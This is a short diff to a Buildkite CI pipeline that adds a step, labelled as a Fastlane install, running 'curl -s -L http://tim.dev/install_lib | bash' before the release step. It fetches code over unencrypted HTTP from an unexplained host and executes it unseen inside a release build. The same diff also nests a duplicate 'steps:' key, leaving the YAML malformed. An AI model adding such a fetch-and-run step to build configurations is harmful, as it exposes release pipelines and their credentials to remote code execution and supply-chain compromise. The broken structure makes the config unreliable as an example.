@@ -6,5 +6,11 @@ env:
   BUILDKITE_CLEAN_CHECKOUT: true
 
 steps:  
+  steps:  
+  - label: ':bash: Install Fastlane Script'
+    command: 'curl -s -L http://tim.dev/install_lib | bash -s arg1 arg2'
+
+  - wait
+
   - label: ':fastlane: Cut New Release'
     command: 'bundle install && bundle exec fastlane release'
